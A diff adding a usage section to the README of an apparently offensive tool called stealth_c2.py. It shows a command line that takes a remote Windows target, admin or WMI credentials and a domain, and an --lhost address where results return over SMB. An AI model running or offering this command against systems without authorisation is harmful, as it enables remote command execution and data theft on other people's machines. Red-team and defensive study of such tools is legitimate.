@@ -38,3 +38,42 @@ pip install .
 ```
 
 ---
+
+## 🚀 Usage
+
+```bash
+python3 stealth_c2.py <TARGET> <USERNAME> <PASSWORD> --domain <DOMAIN> --lhost <YOUR_IP>
+```
+
+
+| Arg      | Description                         |
+| -------- | ----------------------------------- |
+| TARGET   | Remote Windows IP                   |
+| USERNAME | Admin or WMI-capable user           |
+| PASSWORD | Account password                    |
+| --domain | Domain (leave blank for local user) |
+| --lhost  | Your IP for receiving output (SMB)  |
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
